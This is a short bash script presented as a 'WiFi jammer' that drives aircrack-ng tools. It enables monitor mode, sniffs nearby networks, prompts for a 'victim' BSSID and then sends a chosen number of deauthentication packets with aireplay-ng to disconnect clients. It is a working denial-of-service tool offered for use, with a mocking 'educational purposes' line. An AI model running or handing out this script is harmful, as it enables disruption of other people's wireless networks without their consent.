clear 

COL_BLUE="\x1b[34;01m"
echo -e $COL_BLUE
echo "###############################################################"
echo \ "------------------[!GREETINGS!]--------------------------------"
echo \ "###############################################################"
echo \ "X---------------------------------------------------------------X"
echo \ "X---------------------------------------------------------------X"
echo \ "X---------------------------------------------------------------X"
echo \ "X-------------------------------------------------------------X"
echo \ "X--~>>~>~>~>WELCOME TO CLUM-Z's WiFi JAMMER (beta)<~<~<~<~-------X"
echo \ "X-------------------------------------------------------------x"
echo \ "X---------------------------------------------------------------x"
echo \ "X----------------------------------------------------------------x"
echo "###############################################################"
echo \ "-/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\-"
echo \ "##########################################################################################################"
echo \ "NOTE THAT YOU MUST HAVE AN WIRELESS ADAPTER WITH MONITOR MODE TO BE ENABLED AND AIRCRACK-NG UPDATED"
echo \ "######################################################################################################"


airmon-ng
echo \ "IF you get an ERROR while getting interface flags: No such device, please get a proper interface" 
echo \ "Enter your adapter for jamming the WiFi  " 
echo -e "\n"
read interface
airmon-ng start $interface
echo \ "NOTE THAT THE INTERFACE WILL START SNIFFING FOR PACKETS!!                "
echo \ "________________________________________________________"
echo \ "________________________________________________________"
echo \ "PRESS CTRL+C to stop SNIFFING ONCE YOU SEE YOUR VICTIM                   "
echo \ "The monitor mode is enabled on? "

read monitor
airodump-ng $monitor
echo \ "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
echo \ "ENTER the victim's BSSID (XX:XX:XX:XX:XX:XX)"
read victim
echo \ "Enter how many packets you want to send(e.g 10-100-1000)?"
read packets
echo -e "\n"
echo \ "THE ATTACK STARTS NOW! STOP IT ANYTIME USING CTRL+C OR LET IT END :D"
echo -e "\n"
echo -n "THANKS FOR USING!!!!!"
echo -e "\n"
echo -n "THIS IS JUST FOR EDUCATIONAL PURPOSES Haha! ;)"
echo -e "\n"
echo \ "THANKS FOR USING!"
echo -e "\n"
aireplay-ng -0 $packets -a $victim $monitor --ignore-negative-one
echo -e "\n"
echo -e "\n"
echo \ "The only thing that helps me pass the time away; is knowing I'll be back at Echo Beach some day ~ Martha and the Muffins"
echo -e "\n"
echo -e "\n"
exit
